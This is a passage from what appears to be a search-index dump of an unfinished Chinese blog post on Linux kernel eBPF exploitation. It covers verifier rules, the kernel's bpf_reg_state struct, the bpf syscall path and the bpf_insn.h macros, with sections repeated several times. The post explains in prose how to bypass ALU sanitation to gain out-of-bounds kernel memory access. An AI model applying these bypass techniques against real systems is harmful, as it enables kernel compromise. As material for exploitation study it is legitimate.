禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为PTR_TO_CTX） 不能把一个内核指针（如 sk_buff 的地址）直接存到 Map 里，让用户态读取。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:4","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#一些规则"},{"categories":["pwn"],"collections":null,"content":"ALU Sanitation\r在对一个指针类型寄存器进行加减某个offset时，一些指令会被加上去 ，验证offset的合法性，也就是保证这个指针的活动范围 BPF_MOV32_IMM(BPF_REG_AX, aux-\u003ealu_limit - 1); // -1 in old kernel versions BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg); BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg); BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0); BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63); BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg); 简单来说，指针类型寄存器有一个活动范围，指向栈的寄存器活动范围就在栈中，不能通过加减某个offset从而指到别的地方去 绕过ALU Sanitation分两种情况： 如果有一个指针指向0x1000，它允许最大指向0x1500，最小指向0x500。通过了某些漏洞，我们让verifier认为这个指针还是0x1000，但是它实际上是0x500，那么这个寄存器实际上的活动范围就是0 - 0x1000，能够越界读到前面的东西 当这个指针已经在它活动范围的边界的时候，上面的这串指令又把边界减去了1（aux-\u003ealu_limit - 1）,这就导致了无符号数的回绕，边界变成了0xFFFFFFFF，这样我们就能让这个指针指向很大一个范围了 在一些新的内核这个bug被修复了 bpf_reg_state：维护了BPF寄存器的状态。 struct bpf_reg_state { /* 各字段的顺序是重要的. 参见 states_equal() */ enum bpf_reg_type type; /* 指针偏移的固定部分, 仅指针类型 */ s32 off; union { /* 当 type == PTR_TO_PACKET 时可用 */ int range; /* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE | * PTR_TO_MAP_VALUE_OR_NULL 时可用 */ struct { struct bpf_map *map_ptr; /* 为了从外部映射中区分映射查找 * map_uid 对于指向内部映射的寄存器为非 0 值 */ u32 map_uid; }; /* for PTR_TO_BTF_ID */ struct { struct btf *btf; u32 btf_id; }; struct { /* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */ u32 mem_size; u32 dynptr_id; /* for dynptr slices */ }; /* For dynptr stack slots */ struct { enum bpf_dynptr_type type; /* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots. * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从 * dynptr 的第二个 slot 开始的地址的情况的 slot. */ bool first_slot; } dynptr; /* 以上任意一个的最大尺寸. */ struct { unsigned long raw1; unsigned long raw2; } raw; u32 subprogno; /* for PTR_TO_FUNC */ }; /* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解. * 对于指针类型, 其表示从被指向对象的偏移的可变部分， * 且同与我们有相同 id 的所有 bpf_reg_states 共享. */ struct tnum var_off; /* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问. * These refer to the same value as var_off, not necessarily the actual * contents of the register. */ s64 smin_value; /* 最小可能值 (s64) */ s64 smax_value; /* 最大可能值 (s64) */ u64 umin_value; /* 最小可能值 (u64) */ u64 umax_value; /* 最大可能值 (u64) */ s32 s32_min_value; /* 最小可能值 (s32) */ s32 s32_max_value; /* 最大可能值 (s32) */ u32 u32_min_value; /* 最小可能值 (u32) */ u32 u32_max_value; /* 最大可能值 (u32) */ /* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针， * 由此他们可以共享范围信息. * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值 * 当其一被测试于 != NULL. * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放. * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用， * 以确定合适的引用释放. * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用 * 以确定合适的引用释放. */ u32 id; /* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 . * * 考虑如下情况， \"sk\" 为一个返回自 \"sk = bpf_sk_lookup_tcp();\" 的引用计数指针: * * 1: sk = bpf_sk_lookup_tcp(); * 2: if (!sk) { return 0; } * 3: fullsock = bpf_sk_fullsock(sk); * 4: if (!fullsock) { bpf_sk_release(sk); return 0; } * 5: tp = bpf_tcp_sock(fullsock); * 6: if (!tp) { bpf_sk_release(sk); return 0; } * 7: bpf_sk_release(sk); * 8: snd_cwnd = tp-\u003esnd_cwnd; // verifier 将抗议 * * 在第 7 行的 bpf_sk_release(sk) 之后, \"fullsock\" 指针与 * \"tp\" 指针都应当被无效化. 为了这么做, 保存 \"fullsock\" 与 \"sk\" * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-\u003eid) * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-\u003eid 的寄存器 * * sk_reg-\u003eref_obj_id 在第 1 行被设为 sk_reg-\u003eid. * sk_reg-\u003eid 将仅作为 NULL-marking 的目的保持. * 在 NULL-marking 完成后, sk_reg-\u003eid 可以被重置为 0. * * 在第 3 行的 \"fullsock = bpf_sk_fullsock(sk);\" 之后, * fullsock_reg-\u003eref_obj_id 被设为 sk_reg-\u003eref_obj_id. * * 在第 5 行的 \"tp = bpf_tcp_sock(fullsock);\" 之后, * tp_reg-\u003eref_obj_id 被设为 fullsock_reg-\u003eref_obj_id * 与 sk_reg-\u003eref_obj_id 一致. * * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL, * 他们为有着不同 reg-\u003etype 的相同指针. * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) * 相同的影响. */ u32 ref_obj_id; /* 用于存活检查的亲子链 */ struct bpf_reg_state *parent; /* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8, * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 'frameno' 被使用， * 其为一个指向 bpf_func_state 的 bpf_verifier_state-\u003eframe[] 数组中的下标. */ u32 frameno; /* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx. * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用. */ s32 subreg_def; enum bpf_reg_liveness live; /* if (!precise \u0026\u0026 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:5","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#alu-sanitation"},{"categories":["pwn"],"collections":null,"content":"源码\rbpf_prog_load\r当我们调用bpf系统调用令它的cmd = BPF_PROG_LOAD时，会调用到函数bpf_prog_load //kernel/bpf/syscall.c SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) { union bpf_attr attr; ...... switch (cmd) { ...... case BPF_PROG_LOAD: err = bpf_prog_load(\u0026attr, uattr); break; ...... } return err; } 其中会调用到函数bpf_check进行ebpf verifier bpf_check\rcheck_subprogs\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:6","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#源码"},{"categories":["pwn"],"collections":null,"content":"源码\rbpf_prog_load\r当我们调用bpf系统调用令它的cmd = BPF_PROG_LOAD时，会调用到函数bpf_prog_load //kernel/bpf/syscall.c SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) { union bpf_attr attr; ...... switch (cmd) { ...... case BPF_PROG_LOAD: err = bpf_prog_load(\u0026attr, uattr); break; ...... } return err; } 其中会调用到函数bpf_check进行ebpf verifier bpf_check\rcheck_subprogs\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:6","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#bpf_prog_load"},{"categories":["pwn"],"collections":null,"content":"源码\rbpf_prog_load\r当我们调用bpf系统调用令它的cmd = BPF_PROG_LOAD时，会调用到函数bpf_prog_load //kernel/bpf/syscall.c SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) { union bpf_attr attr; ...... switch (cmd) { ...... case BPF_PROG_LOAD: err = bpf_prog_load(\u0026attr, uattr); break; ...... } return err; } 其中会调用到函数bpf_check进行ebpf verifier bpf_check\rcheck_subprogs\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:6","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#bpf_check"},{"categories":["pwn"],"collections":null,"content":"源码\rbpf_prog_load\r当我们调用bpf系统调用令它的cmd = BPF_PROG_LOAD时，会调用到函数bpf_prog_load //kernel/bpf/syscall.c SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) { union bpf_attr attr; ...... switch (cmd) { ...... case BPF_PROG_LOAD: err = bpf_prog_load(\u0026attr, uattr); break; ...... } return err; } 其中会调用到函数bpf_check进行ebpf verifier bpf_check\rcheck_subprogs\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:6","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#check_subprogs"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#指令编写"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#alu类"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + imm32) */ #define BPF_LD_ABS(SIZE, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Memory load, dst_reg = *(uint *) (src_reg + off16) */ #define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* Memory store, *(uint *) (dst_reg + off16) = src_reg */ #define BPF_STX_MEM(SIZE, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = 0 }) /* * Atomic operations: * * BPF_ADD *(uint *) (dst_reg + off16) += src_reg * BPF_AND *(uint *) (dst_reg + off16) \u0026= src_reg * BPF_OR *(uint *) (dst_reg + off16) |= src_reg * BPF_XOR *(uint *) (dst_reg + off16) ^= src_reg * BPF_ADD | BPF_FETCH src_reg = atomic_fetch_add(dst_reg + off16, src_reg); * BPF_AND | BPF_FETCH src_reg = atomic_fetch_and(dst_reg + off16, src_reg); * BPF_OR | BPF_FETCH src_reg = atomic_fetch_or(dst_reg + off16, src_reg); * BPF_XOR | BPF_FETCH src_reg = atomic_fetch_xor(dst_reg + off16, src_reg); * BPF_XCHG src_reg = atomic_xchg(dst_reg + off16, src_reg) * BPF_CMPXCHG r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg) */ #define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF) \\ ((struct bpf_insn) { \\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = OFF, \\ .imm = OP }) /* Legacy alias */ #define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:7","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#赋值类"},{"categories":["pwn"],"collections":null,"content":"指令编写\r在内核源码目录中定义了samples/bpf/bpf_insn.h，可以使用其中的宏指令来编写，比起直接用常数写，简化了很多 使用的时候，include进去即可。（这里加了个BPF_CALL_FUNC） /* SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause) */ /* eBPF instruction mini library */ #ifndef __BPF_INSN_H #define __BPF_INSN_H struct bpf_insn; /* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */ #define BPF_ALU64_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_ALU32_REG(OP, DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */ #define BPF_ALU64_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_ALU32_IMM(OP, DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_OP(OP) | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* Short form of mov, dst_reg = src_reg */ #define BPF_MOV64_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) #define BPF_MOV32_REG(DST, SRC) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_X, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = 0 }) /* Short form of mov, dst_reg = imm32 */ #define BPF_MOV64_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU64 | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) #define BPF_MOV32_IMM(DST, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_ALU | BPF_MOV | BPF_K, \\ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM }) /* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */ #define BPF_LD_IMM64(DST, IMM) \\ BPF_LD_IMM64_RAW(DST, 0, IMM) #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \\ ((struct bpf_insn) { \\ .code = BPF_LD | BPF_DW | BPF_IMM, \\ .dst_reg = DST, \\ .src_reg = SRC, \\ .off = 0, \\ .imm = (__u32) (IMM) }), \\ ((struct bpf_insn) { \\ .code = 0, /* zero is reserved opcode */ \\ .dst_reg = 0, \\ .src_reg = 0, \\ .off = 0, \\ .imm = ((__u64) (IMM)) \u003e\u003e 32 }) #ifndef BPF_PSEUDO_MAP_FD # define BPF_PSEUDO_MAP_FD 1 #endif /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD) \\ BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD) /* Direct packet access, R0 = *(uint *) (skb-\u003edata + 